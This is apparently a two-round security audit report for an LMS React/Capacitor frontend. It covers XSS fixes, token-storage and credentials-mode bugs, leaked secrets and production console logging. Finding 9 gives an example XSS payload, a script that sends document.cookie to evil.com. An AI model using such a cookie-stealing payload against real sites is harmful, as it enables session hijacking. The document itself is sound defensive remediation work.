# SurakshaLMS Frontend — Security & Bug Fix Report

**Date:** 2026-04-26 (Round 1) / 2026-04-26 (Round 2 — deep audit)  
**Scope:** `lms user frotend/` — full codebase audit and remediation  
**Status:** All critical, high, and medium findings resolved across two audit rounds

---

## Summary of Changes

### Round 1 — Core Auth & API Layer

| File | Severity | Issues Fixed |
|---|---|---|
| `.env` | CRITICAL | Real API keys / secrets removed from version control |
| `src/api/cachedClient.ts` | CRITICAL / HIGH | Auth redirect, error types, production logging |
| `src/api/enhancedCachedClient.ts` | CRITICAL / HIGH | Auth redirect, error types, production logging |
| `src/api/attendanceClient.ts` | CRITICAL / HIGH | Hardcoded credentials mode, cooldown logic, logging |
| `src/App.tsx` | HIGH / MEDIUM | Duplicate route, typo routes, listener race condition |
| `src/contexts/AuthContext.tsx` | HIGH / MEDIUM | Missing error handler, production logging |
| `src/components/ProtectedRoute.tsx` | MEDIUM | Production logging of sensitive data |
| `src/services/tokenStorageService.ts` | HIGH | rememberMe preference ignored for token persistence |

### Round 2 — Deep Audit: XSS, Auth Bypass, Credential Leaks

| File | Severity | Issues Fixed |
|---|---|---|
| `src/components/admin-attendance/ExportReporting.tsx` | HIGH | XSS via `document.write` with unescaped API data |
| `src/components/cards/DigitalIdCard.tsx` | HIGH | XSS via `document.write` with unescaped user name/ID |
| `src/utils/printRegistrationForm.ts` | MEDIUM | XSS via unescaped institute name; `javascript:` URL injection via logo src |
| `src/api/childAttendance.api.ts` | CRITICAL | Hardcoded `credentials: 'include'` on mobile; 30+ production console leaks; missing credentials on `markAttendance` |
| `src/api/attendance.api.ts` | CRITICAL | Hardcoded `credentials: 'include'` on all POST/PATCH |
| `src/components/Profile.tsx` | CRITICAL | Access token read from localStorage (always null); hardcoded credentials mode |
| `src/components/QRCodeScanner.tsx` | CRITICAL | Access token read from localStorage bypassing secure store |
| `src/components/Students.tsx` | HIGH | Access token read from localStorage bypassing secure store |
| `src/components/TeacherClasses.tsx` | HIGH | Access token read from localStorage bypassing secure store |
| `src/components/forms/UpdateOrganizationDialog.tsx` | HIGH | Access token read from localStorage bypassing secure store |
| `src/components/admin-attendance/ClassDailyAttendance.tsx` | HIGH | Legacy token read from localStorage; wrong API base URL |
| `src/components/admin-attendance/SubjectDailyAttendance.tsx` | HIGH | Legacy token read from localStorage; wrong API base URL |
| `src/components/admin-attendance/EventAttendanceView.tsx` | HIGH | Legacy token read from localStorage; wrong API base URL |
| `src/components/admin-attendance/StudentAttendanceLookup.tsx` | HIGH | Legacy token read from localStorage; wrong API base URL |
| `src/components/admin-attendance/AttendanceRangeViewer.tsx` | HIGH | Legacy token read from localStorage; wrong API base URL |
| `src/components/ErrorBoundary.tsx` | MEDIUM | Raw error messages exposed to all users in production |
| `src/services/tokenStorageService.ts` | MEDIUM | `Math.random()` used for device ID (predictable) |
| `src/utils/attendanceScanLog.ts` | MEDIUM | `Math.random()` used for entry IDs (predictable) |
| `src/utils/routeGuards.ts` | MEDIUM | 15 console calls leaking paths/roles/params; legacy token check causes false redirects |

---

## Detailed Findings and Fixes

---

### 1. `.env` — Secret Exposure in Version Control

**Severity:** CRITICAL

**Finding:**  
Real credentials were committed to the repository in plain text, including:
- Firebase API key (`AIzaSy...`)
- Firebase Auth Domain, Project ID, Storage Bucket, Messaging Sender ID, App ID, Measurement ID
- Firebase VAPID key for Web Push
- `VITE_SPECIAL_API_KEY` (backend special-access API key)

**Risk:**  
Anyone with read access to the repository could exfiltrate the Firebase project, send push notifications to all users, query Firestore/Storage, and bypass rate-limiting on registration endpoints.

**Fix:**  
All real values replaced with `REPLACE_WITH_...` placeholders. Warning comments added explaining rotation requirements and the non-secret nature of `VITE_SPECIAL_API_KEY` (baked into browser bundle — enforce limits server-side instead).

**Action required:**  
Rotate all Firebase keys and the special API key immediately via Firebase Console and backend settings. Verify `android/app/google-services.json` and `db-out.txt` are excluded from version control (both contain production credentials and database extracts).

---

### 2. `src/api/cachedClient.ts` — Auth Redirect to Non-Existent Route

**Severity:** CRITICAL

**Finding:**  
On token refresh failure (HTTP 401), the client executed:
```typescript
window.location.href = '/login';
```
No `/login` route exists in `App.tsx`. This caused a full-page navigation to a 404/blank screen, bypassing React Router and losing all application state. The `AuthContext` listener that handles proper logout (state cleanup, cache clear, redirect to `/`) was never triggered.

**Fix:**  
Replaced hard redirect with a CustomEvent dispatch:
```typescript
window.dispatchEvent(new CustomEvent('auth:refresh-failed'));
throw error;
```
`AuthContext` listens for `auth:refresh-failed` and performs full, clean logout including state reset, cache clear, and proper React Router navigation.

**Additional fixes in this file:**
- Retry failures now throw `parseApiError()` (structured `ApiError`) instead of `new Error('HTTP ${status}...')` — ensures `handleApiError()` and `getErrorMessage()` work correctly
- HTTP 429 responses now throw `parseApiError()` instead of a plain `Error`
- Network/fetch errors now wrapped in `ApiError` with a user-friendly message
- All unconditional `console.log` / `console.error` calls removed (were leaking request URLs, auth state, and user data to production browser console)
- `getCurrentBaseUrl()` method replaces redundant stored `baseUrl` instance variable — eliminates stale-URL risk when subdomain/tenant changes at runtime

---

### 3. `src/api/enhancedCachedClient.ts` — Same Auth Redirect Issue

**Severity:** CRITICAL

**Finding:**  
Identical hard redirect bug as `cachedClient.ts`:
```typescript
window.location.href = '/login';
```

**Fix:**  
Same pattern applied — dispatches `auth:refresh-failed` CustomEvent. All retry/network/429 errors converted to `ApiError`. All unconditional production logging removed. `getCredentialsMode()` used consistently for the `credentials` fetch option.

---

### 4. `src/api/attendanceClient.ts` — Hardcoded Cookie Credentials on Mobile

**Severity:** CRITICAL

**Finding:**  
Every `fetch()` call in `attendanceClient.ts` included:
```typescript
credentials: 'include' // CRITICAL: Send httpOnly refresh token cookie
```
This is correct on web (where `httpOnly` cookies exist), but breaks silently on Capacitor/Android/iOS — WebViews have no cookie jar, so the refresh token is never sent. Attendance API calls would fail auth on every mobile request with no visible error.

**Fix:**  
Imported `getCredentialsMode` from `auth.api.ts` (the established platform-aware helper):
```typescript
import { getCredentialsMode } from '@/contexts/utils/auth.api';

// In every fetch call:
credentials: getCredentialsMode(), // 'include' on web, 'omit' on native
```

**Additional fixes in this file:**
- Cooldown guard previously `throw new Error('Please wait...')` immediately — now tries stale cache first, then falls through; only throws if no data is available at all
- Auth redirect on 401 converted from `window.location.href = '/login'` to `auth:refresh-failed` CustomEvent dispatch
- All errors converted from plain `Error` to `parseApiError()` / `ApiError`
- All unconditional production `console.log` / `console.error` calls removed

---

### 5. `src/App.tsx` — Duplicate Route, Typo Routes, Listener Race Condition

**Severity:** HIGH / MEDIUM

#### 5a. Duplicate `/my-submissions` Route (HIGH)

**Finding:**  
Two routes were registered for the same path:
```typescript
// Line 378 — unprotected, matches first in React Router v6:
<Route path="/my-submissions" element={<Index />} />

// Line 403 — protected, but never reached:
<Route path="/my-submissions" element={
  <ProtectedRoute allowedRoles={['Student']}>
    <MySubmissions />
  </ProtectedRoute>
} />
```
React Router v6 returns the first match. Any user (authenticated or not) was served the `<Index />` component instead of the protected `<MySubmissions />`.

**Fix:**  
Removed the unprotected duplicate route (replaced with a comment explaining the protected version below handles this path).

#### 5b. Typo in Route Paths (MEDIUM)

**Finding:**  
Two routes used `/payment-submissions-pysical` — a typo for `physical`. Both the route definition and its corresponding `<Route>` element contained the misspelling, making those pages unreachable via any correct URL.

**Fix:**  
All occurrences corrected to `/payment-submissions-physical` using `replace_all`.

#### 5c. Capacitor App State Listener Race Condition (MEDIUM)

**Finding:**  
```typescript
let handle: PluginListenerHandle | null = null;
CapacitorApp.addListener('appStateChange', (state) => { ... }).then(h => { handle = h; });
return () => {
  handle?.remove(); // handle is null if Promise hadn't resolved yet
};
```
If the component unmounted before the `addListener` Promise resolved (e.g., during fast navigation), `handle` was still `null` and `.remove()` was never called — leaking the event listener.

**Fix:**  
Stored the Promise itself and chained cleanup correctly:
```typescript
const listenerPromise = CapacitorApp.addListener('appStateChange', (state) => { ... });
return () => {
  listenerPromise.then((h) => h.remove()).catch(() => {});
};
```

---

### 6. `src/contexts/AuthContext.tsx` — Unhandled Rejection Skips State Cleanup

**Severity:** HIGH

**Finding:**  
`handleRefreshFailed` called:
```typescript
logoutUser().then(() => {
  apiCache.clearAllCache();
  setUser(null);
  setSelectedInstitute(null);
  // ... full state reset
});
```
If `logoutUser()` threw or rejected (network error, server error), the entire `.then()` block was silently skipped. The user would appear authenticated (token expired, state not cleared), causing infinite retry loops and inconsistent UI.

**Fix:**  
```typescript
logoutUser()
  .catch(() => {})   // ignore logout API errors — local cleanup must always run
  .finally(() => {
    apiCache.clearAllCache();
    setUser(null);
    setSelectedInstitute(null);
    // ... full state reset always executes
  });
```

**Additional fixes:**  
Removed 20+ unconditional `console.log` / `console.error` / `console.warn` calls that leaked to the production browser console:
- User IDs and email addresses
- Institute counts and selection state
- Auth initialization flow details
- Token refresh scheduling timestamps
- Internal error stack traces

---

### 7. `src/components/ProtectedRoute.tsx` — Production Logging of Sensitive Route Data

**Severity:** MEDIUM

**Finding:**  
Multiple `console.log` / `console.warn` / `console.error` calls in the validation flow logged:
- Current route path (`location.pathname`)
- User email and role
- Validation failure reasons (e.g., `"Insufficient permissions. Required: SuperAdmin"`)
- Selected institute / class / subject IDs

These were visible in any user's browser DevTools console, enabling role enumeration and leaking internal routing logic.

**Fix:**  
Complete rewrite of `ProtectedRoute` with all logging removed. Validation logic preserved and simplified — `validateAccess` made synchronous (it was already fully synchronous despite being declared `async`). Check numbering corrected (previous version skipped from Check 2 to Check 4).

---

### 8. `src/services/tokenStorageService.ts` — rememberMe Preference Ignored

**Severity:** HIGH

**Finding:**  
`setRefreshToken()` always wrote the refresh token to `localStorage` regardless of the user's "Remember Me" selection:
```typescript
// Old code — always persisted:
try { localStorage.setItem(KEYS.REFRESH_TOKEN, token); } catch {}
```
`localStorage` survives browser restarts. Users who did NOT check "Remember Me" still had their session persist indefinitely across restarts — contrary to the expected security boundary.

**Fix:**  
```typescript
const rememberMe = localStorage.getItem(KEYS.REMEMBER_ME) === 'true';
if (rememberMe) {
  try { localStorage.setItem(KEYS.REFRESH_TOKEN, token); } catch {}
} else {
  // Actively remove any previously stored token to clear stale data
  try { localStorage.removeItem(KEYS.REFRESH_TOKEN); } catch {}
}
```
Refresh token now only persists to `localStorage` (cross-restart) when the user explicitly opted in. Without `rememberMe`, the token lives only in `sessionStorage` (tab-scoped, cleared on browser close).

---

## Remaining Manual Actions Required

The following issues require manual action outside the codebase:

1. **Rotate Firebase credentials** — Keys committed to git history are compromised regardless of the `.env` fix. Rotate via Firebase Console > Project Settings > Service accounts.

2. **Rotate `VITE_SPECIAL_API_KEY`** — The special API key was committed in plain text. Rotate on the backend and update `.env`.

3. **Remove `android/app/google-services.json` from git history** — This file contains the Firebase project number, app ID, and API key. Use `git filter-repo` or BFG Repo Cleaner to purge it from all history, then force-push. Add to `.gitignore`.

4. **Remove `db-out.txt` from git history** — This file contains a production database extract with institute names and subdomains. Treat as a data breach — assess and notify affected users per applicable regulations. Purge from git history.

5. **Add `.env` itself to `.gitignore`** — Verify `.env` (not `.env.example`) is excluded. The `.env.example` file with placeholders is appropriate to commit.

6. **Enforce `VITE_SPECIAL_API_KEY` server-side** — Since this key is baked into the browser bundle it is not a secret. The backend must enforce rate limiting, CAPTCHA, or signed tokens for the public registration/OTP endpoints it gates.

7. **Add Content-Security-Policy headers** — No CSP is configured. Add a strict CSP via server response headers or meta tag to mitigate XSS impact.

8. **Rename `SecureCacheManager`** — The cache layer in `src/api/cache/SecureCacheManager.ts` uses IndexedDB/localStorage with no encryption. The name is misleading. Rename to `ApiCacheManager` to prevent future engineers from assuming data is encrypted at rest.

---

## Round 2 Detailed Findings and Fixes

---

### 9. `src/components/admin-attendance/ExportReporting.tsx` — XSS via `document.write`

**Severity:** HIGH

**Finding:**  
`buildPrintDocument()` constructed HTML by directly interpolating API response fields:
```typescript
<td>${r.studentName || r.userName || '—'}</td>
<td>${r.remarks || '—'}</td>
```
If the backend returned a student name like `<script>fetch('https://evil.com?c='+document.cookie)</script>`, it would execute in the new print window with the user's origin.

**Fix:**  
Added `escHtml()` helper and applied it to all 14 interpolated API fields in both the table rows and the document header:
```typescript
function escHtml(value: unknown): string {
  return String(value ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;') ...
}
<td>${escHtml(r.studentName || r.userName || '—')}</td>
```

---

### 10. `src/components/cards/DigitalIdCard.tsx` — XSS via Print HTML

**Severity:** HIGH

**Finding:**  
`buildA4PrintHtml()` interpolated `cardData.id` and `cardData.nameWithInitials` directly into inline-style HTML written to a print window via `document.write`. Malicious values from the API could inject arbitrary HTML.

**Fix:**  
Added inline `escHtml()` and applied it before use:
```typescript
const escHtml = (v: unknown) => String(v ?? '').replace(/&/g, '&amp;') ...
const cdId   = escHtml(cardData?.id || 'N/A');
const cdName = escHtml(cardData?.nameWithInitials || 'N/A');
```

---

### 11. `src/utils/printRegistrationForm.ts` — XSS + URL Injection

**Severity:** MEDIUM

**Finding:**  
- `instituteName` was interpolated directly into `<div class="institute-name">${instituteName}</div>` without escaping
- `instituteLogoUrl` and `appLogoUrl` were put directly into `<img src="...">` attributes with no scheme validation — a `javascript:` URI would execute code on click

**Fix:**  
Added `escHtml()` for HTML escaping and `safeSrc()` for URL validation:
```typescript
function safeSrc(url: string): string {
  return /^(https?:|data:image\/)/i.test(url.trim()) ? url : '';
}
```

---

### 12. `src/api/childAttendance.api.ts` — Critical Mobile Auth + 30+ Console Leaks

**Severity:** CRITICAL

**Finding:**  
- `markAttendanceByCard()` and `markAttendanceByInstituteCard()` hardcoded `credentials: 'include'` — broken on Capacitor/mobile (same issue as previously fixed in `attendanceClient.ts`)
- `markAttendance()` had NO `credentials` option at all — refresh-token cookie never sent
- 30+ `console.log/error/warn` blocks logged: full request bodies including student IDs, institute IDs, class names, API URLs, and auth headers — all visible in production browser DevTools
- Stray leading whitespace on the import line

**Fix:**  
Added `getCredentialsMode` import; replaced all three `credentials: 'include'` with `getCredentialsMode()`; added credentials to the `markAttendance` call that had none; removed all 30+ console statements; fixed import whitespace.

---

### 13. `src/api/attendance.api.ts` — Hardcoded Credentials on Mobile

**Severity:** CRITICAL

**Finding:**  
Two shared helpers `postAttendance()` and `patchAttendance()` used by all mark-attendance APIs hardcoded `credentials: 'include'`, breaking mobile attendance marking.

**Fix:**  
Added `getCredentialsMode` to imports; replaced both occurrences with `getCredentialsMode()`.

---

### 14. `src/components/Profile.tsx` — Token Read from localStorage (Always Null)

**Severity:** CRITICAL

**Finding:**  
The password-change handler read the access token from `localStorage.getItem('access_token')`. The secure token service keeps the access token **in memory only** on web — this read always returns `null`, causing the handler to call `logout()` before attempting the API call. Password changes were completely broken in production.

Additionally, `credentials: 'include'` was hardcoded for both the v2 and v1 fallback fetch calls.

**Fix:**  
Imported `getApiHeadersAsync` and `getCredentialsMode` from `auth.api.ts`. Replaced the localStorage read with `getApiHeadersAsync()` and gated on `authHeaders['Authorization']` to detect missing auth.

---

### 15. `src/components/QRCodeScanner.tsx` — Token Read from localStorage

**Severity:** CRITICAL

**Finding:**  
`getApiHeaders()` attempted `localStorage.getItem('access_token') || localStorage.getItem('token') || localStorage.getItem('authToken')` — all of which are null in the SSO v2 architecture. QR attendance scanning was submitting requests without auth headers.

**Fix:**  
Replaced the entire `getApiHeaders()` function body with `return getAuthHeadersSync()` (imported from `tokenStorageService`), which reads from the in-memory token store.

---

### 16. Nine Components — Token Read from localStorage Bypassing Secure Store

**Severity:** HIGH

**Finding:**  
Eight additional components (`Students.tsx`, `TeacherClasses.tsx`, `UpdateOrganizationDialog.tsx`, `ClassDailyAttendance.tsx`, `SubjectDailyAttendance.tsx`, `EventAttendanceView.tsx`, `StudentAttendanceLookup.tsx`, `AttendanceRangeViewer.tsx`) all had the same `localStorage.getItem('token')` or `localStorage.getItem('access_token')` anti-pattern — all returning null in SSO v2, causing unauthenticated API calls.

Additionally, five of them used `import.meta.env.VITE_API_URL || 'http://localhost:3000/api'` as the API base URL — `VITE_API_URL` is not a configured variable in this project, so they always fell back to `http://localhost:3000/api` in production (pointing nowhere).

**Fix:**  
For each component:
- Added `import { getAuthHeadersSync } from '@/services/tokenStorageService'`
- Replaced `getApiHeaders()` bodies (or inline token reads) with `getAuthHeadersSync()`
- Corrected base URL to `import.meta.env.VITE_LMS_BASE_URL || 'https://lmsapi.suraksha.lk'`

---

### 17. `src/components/ErrorBoundary.tsx` — Error Messages Exposed in Production

**Severity:** MEDIUM

**Finding:**  
The error boundary rendered `this.state.error.message` in a `<pre>` block visible to all users. Error messages can contain file paths, function names, variable values, and internal API details.

**Fix:**  
Gated error message display behind `import.meta.env.DEV`:
```typescript
{import.meta.env.DEV && this.state.error && (
  <pre>...</pre>
)}
```
The `componentDidCatch` console.error is also gated behind `import.meta.env.DEV`.

---

### 18. `Math.random()` for Security-Sensitive IDs

**Severity:** MEDIUM

**Finding:**  
Two IDs generated with `Math.random()`:
- `tokenStorageService.ts`: Device ID used to identify mobile sessions — predictable, allowing session enumeration on mobile
- `attendanceScanLog.ts`: Scan log entry IDs — predictable, allowing log tampering detection bypass

**Fix:**  
- `tokenStorageService.ts`: Replaced with `crypto.getRandomValues(new Uint8Array(8))` converted to hex — cryptographically random
- `attendanceScanLog.ts`: Replaced with `crypto.randomUUID()` — guaranteed unique and unpredictable

---

### 19. `src/utils/routeGuards.ts` — 15 Console Leaks + Broken Session Check

**Severity:** MEDIUM

**Finding:**  
1. **15 unconditional console calls** leaked: route paths, user roles, validation failure reasons, URL parameter keys and values (including malicious payloads in SECURITY ALERT logs — a partial XSS amplification), navigation targets, and rate-limit details
2. `validateUrlParams()` logged suspicious parameter values verbatim — attacker input echoed to logs
3. `useSessionValidation()` read `localStorage.getItem('token')` which is always null in SSO v2, causing `!token && user` to be true for every authenticated user — would redirect all authenticated users to `/` if ever called
4. Rate-limit detection used `console.error` + `console.log` instead of an event

**Fix:**  
- Removed all 15 console calls
- Rewrote `useRateLimitDetection` to dispatch a `api:rate-limited` CustomEvent with `retryAfter` detail instead of logging
- Fixed `useSessionValidation` to use `tokenStorageService.getAccessTokenSync()` — reads correctly from in-memory store
- Added `tokenStorageService` import

---

## Security Architecture — What Is Correct

The following patterns were already implemented correctly and were preserved:

- **Access token in memory only (web)** — Never written to `localStorage` or `sessionStorage`, protecting against XSS token theft
- **HttpOnly cookie for refresh token (web)** — Server sets `httpOnly; Secure; SameSite=Strict` cookie; browser sends it automatically on `credentials: 'include'` requests
- **Encrypted SecureStorage on mobile** — Keychain (iOS) / EncryptedSharedPreferences (Android) for all tokens
- **Multi-tab sync via BroadcastChannel** — Rotated refresh tokens propagated to all open tabs, preventing revoked-token replays
- **`getCredentialsMode()` helper** — Single source of truth for platform-aware `credentials` fetch option (now used consistently across all clients)
- **`auth:refresh-failed` / `auth:refresh-success` CustomEvents** — Clean decoupling between API layer and auth state management
- **`ApiError` / `parseApiError()`** — Consistent structured error type with message sanitization across the entire API surface
- **`rememberMe`-gated `localStorage` persistence** — (Now correctly enforced after fix #8 above)
- **RBAC via `ProtectedRoute`** — Server-side enforcement is the authoritative check; client-side RBAC provides UX-level gating
